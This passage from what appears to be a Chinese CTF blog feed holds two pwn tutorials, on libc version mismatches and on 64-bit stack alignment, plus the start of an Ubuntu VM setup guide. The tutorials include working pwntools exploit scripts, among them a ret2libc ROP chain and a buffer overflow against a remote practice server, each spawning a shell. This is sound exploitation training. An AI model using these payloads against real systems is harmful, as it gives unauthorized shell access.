函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9812.png"></p><p>直接 finish 结束函数，可以获得 shell：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9813.png" alt="PWN中程序的libc问题13.png"></p><p>在 Pycharm 中运行的 exp 也同步获得 shell：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9814.png" alt="PWN中程序的libc问题14.png"></p><blockquote><p>由此可以得出结论：<br>其实 Ubuntu 22.04 中无法 getshell 的原因就是 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 的地址计算错误<br>而 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 的地址是由 libc 文件计算偏移得来的，因此问题出在 libc 文件上</p></blockquote><hr><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>由于题目给的 libc 文件为 <code>libc-2.23.so</code>，在 Ubuntu 16.04 这样的老版本中没有问题</p><p>但是在 Ubuntu 22.04 这样的新版本中就不对了</p><p>Ubuntu 16.04 的 glibc 版本：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9815.png" alt="PWN中程序的libc问题15.png"></p><p>Ubuntu 22.04 的 glibc 版本：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9816.png" alt="PWN中程序的libc问题16.png"></p><p><mark>解决办法就是在 Ubuntu 22.04 中使用 Ubuntu 22.04 自带的新版 glibc 来运行程序</mark></p><blockquote><p>注意：<br>更改程序运行时使用的 libc 版本需要与 ld 文件的版本对应，由于 Ubuntu 22.04 使用的 ld 版本为 2.35，所以如果指定题目给出的 <code>libc-2.23.so</code> 文件会使程序运行崩溃：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9819.png" alt="PWN中程序的libc问题19.png"></p><p>这里需要指定 Ubuntu 22.04 自带的 libc 文件</p></blockquote><p>Ubuntu 22.04 自带的 glibc 一般位于 <code>/usr/lib/x86_64-linux-gnu/libc.so.6</code>，也可以使用命令来查找：<code>sudo find / -name libc.so.6</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9817.png" alt="PWN中程序的libc问题17.png"></p><p>将 exp 改写如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># 指定使用 Ubuntu 22.04 自带的 glibc 来运行程序</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./Login'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span> <span class="token string">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span><span class="token comment"># 计算偏移的 libc 也需要与程序相统一</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时即可正常 getshell：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9818.png" alt="PWN中程序的libc问题18.png"></p><hr><h2 id="再次调试分析"><a href="#再次调试分析" class="headerlink" title="再次调试分析"></a>再次调试分析</h2><p>再次在 Ubuntu 22.04 下调试分析</p><p>单步执行，发现地址都已经正常，可以调用 <code>system(&quot;/bin/sh&quot;)</code> 来 getshell 了</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9821.png" alt="PWN中程序的libc问题21.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9820.png" alt="PWN中程序的libc问题20.png"></p>]]></content>
    
    
    <summary type="html">对于程序中没有 system 函数与 &quot;/bin/sh&quot; 的情况，我们通常需要使用到 libc，通过计算 libc 偏移来获取 system 函数与 &quot;/bin/sh&quot; 的地址，但是有时会发现同样的 exp 为什么无法 getshell？因为 libc 版本不一致，导致计算出来的偏移是错误的</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Pwntools" scheme="https://www.uf4te.cn/tags/Pwntools/"/>
    
  </entry>
  
  <entry>
    <title>PWN中64位程序的堆栈平衡</title>
    <link href="https://www.uf4te.cn/posts/58163c9b.html"/>
    <id>https://www.uf4te.cn/posts/58163c9b.html</id>
    <published>2023-11-17T16:00:00.000Z</published>
    <updated>2024-06-05T06:37:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h1><blockquote><p>PWN 堆栈平衡是指在 PWN 漏洞利用中，为了保证 payload 的字节数是 16 的倍数，需要对堆栈进行平衡；<strong>而在 32 位 PWN 漏洞利用中，没有堆栈平衡一说，仅在 64 位中存在</strong></p><p><code>glibc2.27</code> 以后引入 XMM 寄存器，用于记录程序状态。主要出现在 Ubuntu 18.04 及以后的版本，需要考虑堆栈平衡 （栈对齐）</p><p>主要原因在于:<br>在调用 <code>system()</code> 函数时，会进入 <code>do_system</code> 执行一个 <code>movaps</code> 指令对 XMM 寄存器进行操作，<code>movaps</code> 指令要求 <code>RSP</code> 按 16 字节对齐，即：**<code>RSP</code> 中地址的最低 4 位必须为 0，直观地说，就是该地址必须以数字 0 结尾**</p><p><em>问：如何解决堆栈平衡问题？</em><br><mark>可以通过在进入 <code>system()</code> 函数之前增加一个 <code>ret</code> 指令来解决（常用），或者也可以在 <code>system()</code> 函数中不执行第一条 <code>push rbp</code> 操作来解决</mark></p><p><em>问：为什么加的是 ret 指令？</em><br>由于在 <code>system()</code> 函数之前加入了一个新地址，栈顶被迫下移 8 个字节，使之对齐 16 字节，满足 <code>movaps</code> 指令对 XMM 寄存器进行操作的条件；同时，由于插入的地址指向了 <code>ret</code> 指令，程序仍然可以顺利地进入 <code>system(&quot;/bin/sh&quot;)</code> 中，<strong>不会改变程序执行流程</strong></p></blockquote><ol><li>XMM 寄存器是 <strong>128 位</strong>的寄存器，称为：<em>浮点数寄存器</em>，包括 XMM0 - XMM15</li></ol><p>XMM 寄存器主要用于：</p><ul><li>32 位和 64 位<em>浮点数</em>的操作</li><li>SIMD 指令：一条 SIMD 指令可以同时接受多个数据流，提升处理速度</li><li>SSE 指令：一般用不到，不详细讨论</li></ul><p>除了 XMM 寄存器外，还有 <strong>256 位</strong>的 YMM 寄存器和 <strong>512 位</strong>的 ZMM 寄存器，也是类似的功能<br>随着 ZMM 的出现，XMM 和 YMM 寄存器的个数被扩展到了 32 个</p><ol start="2"><li><code>movups</code> 和 <code>movaps</code> 是 x86 汇编语言中的两条指令，用于数据传输操作，通常用于将数据从内存加载到 XMM 寄存器或从 XMM 寄存器存储到内存</li></ol><ul><li><code>movups</code></li></ul><p>把源存储器内容值送入目的寄存器，但<strong>不必对齐内存 16 字节</strong></p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">movups xmm<span class="token punctuation">,</span> xmm<span class="token operator">/</span>m128movups xmm<span class="token operator">/</span><span class="token number">128</span><span class="token punctuation">,</span> xmm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>movaps</code></li></ul><p>把源存储器内容值送入目的寄存器，<mark><strong>当有 m128 时，必须对齐内存 16 字节，也就是内存地址低 4 位为全 0</strong></mark></p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">movaps xmm<span class="token punctuation">,</span> xmm<span class="token operator">/</span>m128movaps xmm<span class="token operator">/</span><span class="token number">128</span><span class="token punctuation">,</span> xmm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>除此之外，还可以得知：</li></ol><ul><li>使用 XMM 寄存器时，需要 16 字节对齐</li><li>使用 YMM 寄存器时，需要 32 字节对齐</li><li>使用 ZMM 寄存器时，需要 64 字节对齐</li></ul><hr><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>以攻防世界的一道 PWN 题为例：<a href="https://adworld.xctf.org.cn/media/file/task/291721f42a044f50a2aead748d539df0">【攻防世界】level0</a></p><p>程序保护机制：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%201.png" alt="攻防世界-level0 1.png"></p><p>程序逻辑：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%203.png" alt="攻防世界-level0 3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%204.png" alt="攻防世界-level0 4.png"></p><p>存在后门函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%205.png" alt="攻防世界-level0 5.png"></p><p>得到 <code>callsystem</code> 函数的地址为：<code>0x400596</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%207.png" alt="攻防世界-level0 7.png"></p><p>脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56877</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成对象elf</span>callsystem_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取callsystem函数的地址，本题为:0x0400596，在ida中可以看到函数的地址</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>  <span class="token comment"># 这里不用callsystem_addr直接用0x0400596也是可以的</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这个脚本在远程是可以打通的，如图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A11.png" alt="PWN-64位PWN程序堆栈平衡1.png"></p><p>但是在本地不可以，打不通<br>显示：<code>[*] Got EOF while reading in interactive</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A12.png" alt="PWN-64位PWN程序堆栈平衡2.png"></p><blockquote><p>玄学的问题出现了：</p><p>同样的脚本，同样的程序，在远程可以打通，在本地就打不通</p></blockquote><hr><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>在 python 脚本发送 payload 之前，通过 gdb 附加调试：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python 脚本被暂停：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A19.png" alt="PWN-64位PWN程序堆栈平衡9.png"></p><p>gdb 自动断在 <code>read()</code> 函数中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A110.png" alt="PWN-64位PWN程序堆栈平衡10.png"></p><p>终端中按任意键继续执行 python 脚本</p><p>gdb 直接 finish 跳出 <code>read()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A111.png" alt="PWN-64位PWN程序堆栈平衡11.png"></p><p>gdb 一直 ni 单步执行到 <code>system()</code> 函数的调用处</p><p>发现参数是 <code>&quot;/bin/sh&quot;</code> 没有问题</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A16.png" alt="PWN-64位PWN程序堆栈平衡6.png"></p><p>gdb 继续 ni 单步执行</p><p>发现 gdb 报错：<code>Program received signal SIGSEGV, Segmentation fault.</code></p><p>程序断在：<code>0x7ff1e1c50973 &lt;do_system+115&gt;    movaps xmmword ptr [rsp], xmm1</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A15.png" alt="PWN-64位PWN程序堆栈平衡5.png"></p><p>说明这一条指令出现问题</p><p>gdb 继续 ni 单步执行也不会发生任何变化</p><p>观察 RSP 寄存器的值为 <code>0x7ffffb7aa188</code>，<strong>没有 16 字节对齐（最低 4 位不是 0）</strong></p><hr><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>在进入 <code>system()</code> 函数之前，增加一个 <code>ret</code> 指令，因为 <code>ret</code> 指令不会改变程序的执行流</p><p>使用 ROPgadget 查找 ret 指令地址：<code>ret_addr = 0x400431</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A13.png" alt="PWN-64位PWN程序堆栈平衡3.png"></p><p>将 payload 改为 <code>payload = b&#39;a&#39; * (0x80 - 0x00 + 0x08) + p64(ret_addr) + p64(callsystem_addr)</code> 即可打通本地</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A14.png" alt="PWN-64位PWN程序堆栈平衡4.png"></p><p>改进后脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56877</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成对象elf</span>callsystem_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取callsystem函数的地址，本题为:0x0400596，在ida中可以看到函数的地址</span>ret_addr <span class="token operator">=</span> <span class="token number">0x400431</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>  <span class="token comment"># 添加一个 p64(ret_addr) 平衡堆栈</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="再次调试分析"><a href="#再次调试分析" class="headerlink" title="再次调试分析"></a>再次调试分析</h2><p>在 <code>vulnerable_function()</code> 执行完后，会多执行一个 <code>ret</code> 指令，地址位于 <code>0x400431</code></p><p>然后 ni 单步执行到达 <code>system()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A17.png" alt="PWN-64位PWN程序堆栈平衡7.png"></p><p>使用 si 进入 <code>system()</code> 函数内部</p><p>ni 单步执行到 <code>movaps xmmword ptr [rsp], xmm1</code> 语句处</p><p>可以看到已经可以通过 ni 单步执行到 <code>movaps xmmword ptr [rsp], xmm1</code> 这一句后面</p><p>已经不会再报错了</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A18.png" alt="PWN-64位PWN程序堆栈平衡8.png"></p><p>可以看到此时 RSP 为：<code>0x7ffe95f29310</code>，<strong>已经 16 字节对齐了（最低 4 位为 0）</strong></p>]]></content>
    
    
    <summary type="html">在学习 PWN 的栈溢出漏洞 ROP 时遇到 ret2text 类题目，通过构造 payload 进行 system 调用将 &quot;/bin/sh&quot; 作为参数来获取 shell，32 位与 64 位除了传参方式不一样，有时 64 位还需要额外加上一个 ret 地址来 getshell，否则无法打通，这就是堆栈平衡引起的</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04虚拟机环境搭建</title>
    <link href="https://www.uf4te.cn/posts/2b805828.html"/>
    <id>https://www.uf4te.cn/posts/2b805828.html</id>
    <published>2023-11-07T16:00:00.000Z</published>
    <updated>2024-06-05T06:35:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>安装软件或 <code>git</code> 仓库到本地时，建议在路径 <code>/opt</code> 下安装或存放，养成文件管理的习惯  </p><p>另外，apt 安装时建议使用新的 <code>sudo apt install xxx</code> 代替旧的 <code>sudo apt-get install xxx</code></p></blockquote><p>使用 pip 安装库时，<code>pip install xxx</code> 和 <code>sudo pip install xxx</code> 安装的库路径不一样，例如：</p><ul><li><code>sudo pip install xxx</code> 安装路径：<code>/usr/local/lib/python3.10/dist-packages/</code></li><li><code>pip install xxx</code> 安装路径：<code>/home/wyy/.local/lib/python3.10/site-packages/</code></li></ul><p><strong>尽量不要使用 <code>sudo pip install</code> 来安装 python 库</strong></p><hr><p><mark>如果搭建 Ubuntu 22.04 这种新版本的环境，请移步：《<a href="Ubuntu22.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">Ubuntu22.04虚拟机环境搭建</a>》</mark></p><hr><p>以下所有的安装都基于 Ubuntu 16.04 （需要升级 pip 和 python）虚拟机进行了测试，因为许多地方与 Ubuntu 22.04 有所区别，所以另写了一篇专门针对 Ubuntu 16.04 的配置</p><blockquote><p><strong>不算 tips 的小 tips：</strong></p><ol><li><em>VM 虚拟机挂起后再保存快照可以秒存，但开机运行状态保存快照相当慢（开机运行状态保存快照中途是可以继续操作虚拟机的，不影快照的保存）</em></li><li>如果发现在虚拟机中，鼠标的额外功能键无法使用，比如：前进、后退等<br>在虚拟机文件夹下，有一个 <code>xxx.vmx</code> 的文件，<u>在虚拟机关闭的条件下</u>，使用记事本打开，在文件的最后添加如下内容，重新开启虚拟机，即可<em>使用鼠标的额外功能键</em>：<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mouse.vusb.enable <span class="token operator">=</span> <span class="token string">"TRUE"</span>  mouse.vusb.useBasicMouse <span class="token operator">=</span> <span class="token string">"FALSE"</span>  usb.generic.allowHID <span class="token operator">=</span> <span class="token string">"TRUE"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><em>Ubuntu 16.04 将屏幕左侧的启动器栏移动到屏幕底部</em>，在终端输入：<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gsettings <span class="token builtin class-name">set</span> com.canonical.Unity.Launcher launcher-position Bottom<span class="token comment"># 如果想换回左侧，输入：</span>gsettings <span class="token builtin class-name">set</span> com.canonical.Unity.Launcher launcher-position Left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>如果<em>开机出现显示器相关报错</em>：无法应用原保存的显示器配置或者 CRTC 63 相关问题<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> ~/.config/monitors.xml<span aria-hidden="true" 